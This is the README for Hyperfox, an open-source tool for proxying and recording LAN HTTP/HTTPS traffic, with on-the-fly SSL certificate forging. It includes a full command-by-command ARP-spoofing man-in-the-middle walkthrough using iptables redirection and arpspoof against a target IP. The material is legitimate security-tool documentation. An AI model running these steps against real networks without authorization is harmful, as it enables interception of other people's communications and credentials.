# Hyperfox

[Hyperfox][1] is a security tool for proxying and recording HTTP and HTTPs
communications on a LAN.

![Hyperfox diagram](https://hyperfox.org/images/hyperfox-diagram.png)

Hyperfox is capable of forging SSL certificates on the fly using a root CA
certificate and its corresponding key (both provided by the user). If the
target machine recognizes the root CA as trusted, then HTTPs traffic can be
successfully intercepted and recorded.

![Hyperfox SSL](https://hyperfox.org/images/hyperfox-diagram.png)

This is the development repository, check out the [https://hyperfox.org][1]
site for usage information.

## Getting Hyperfox

See the [download](https://hyperfox.org/download) page for binary builds and
compilation instructions.

## A common example: hyperfox with arpspoof on Linux

The following example assumes that hyperfox is installed on a Linux box (host)
on which you have root access or sudo privileges and that the target machine is
connected on the same LAN as the host.

We are going to use the `arpspoof` tool that is part of the [dsniff][4] suite
to alter the ARP table of the target machine in order to make it redirect its
traffic to Hyperfox instead of to the legitimate LAN gateway. This is an
ancient technique known as [ARP spoofing][6].

First, identify both the local IP of the legitimate gateway and its matching
network interface.

```sh
> sudo route
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         10.0.0.1        0.0.0.0         UG    1024   0        0 wlan0
...
```

The interface in our example is called `wlan0` and the interface's gateway is
`10.0.0.1`.

```sh
> export HYPERFOX_GW=10.0.0.1
> export HYPERFOX_IFACE=wlan0
```

Then identify the IP address of the target, let's suppose it is `10.0.0.143`.

```sh
> export HYPERFOX_TARGET=10.0.0.143
```

Enable IP forwarding on the host for it to act (temporarily) as a common
router.

```sh
> sudo sysctl -w net.ipv4.ip_forward=1
```

Issue an `iptables` rule to instruct the host to redirect all traffic that goes
to port 80 (commonly HTTP) to a local port where Hyperfox is listening to
(1080).

```sh
> sudo iptables -A PREROUTING -t nat -i $HYPERFOX_IFACE -p tcp --destination-port 80 -j REDIRECT --to-port 1080
```

We're almost ready, prepare hyperfox to receive plain HTTP traffic:

```sh
> hyperfox
...
2014/12/31 07:53:29 Listening for incoming HTTP client requests on 0.0.0.0:1080.
```

Finally, run `arpspoof` to alter the target's ARP table so it starts sending
its network traffic to the host box.

```sh
> sudo arpspoof -i $HYPERFOX_IFACE -t $HYPERFOX_TARGET $HYPERFOX_GW
```

## Contributing to Hyperfox development

Sure, there's a lot of opportunity. Choose an [issue][7], fix it and send a
pull request.

## License

> Copyright (c) 2012-2014 José Carlos Nieto, https://menteslibres.net/xiam
>
> Permission is hereby granted, free of charge, to any person obtaining
> a copy of this software and associated documentation files (the
> "Software"), to deal in the Software without restriction, including
> without limitation the rights to use, copy, modify, merge, publish,
> distribute, sublicense, and/or sell copies of the Software, and to
> permit persons to whom the Software is furnished to do so, subject to
> the following conditions:
>
> The above copyright notice and this permission notice shall be
> included in all copies or substantial portions of the Software.
>
> THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
> EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
> MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
> NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE
> LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION
> OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION
> WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

[1]: https://hyperfox.org
[2]: https://golang.org/doc/install
[3]: https://en.wikipedia.org/wiki/Man-in-the-middle_attack
[4]: http://monkey.org/~dugsong/dsniff/
[5]: http://git-scm.com
[6]: https://en.wikipedia.org/wiki/ARP_spoofing
[7]: https://github.com/xiam/hyperfox/issues
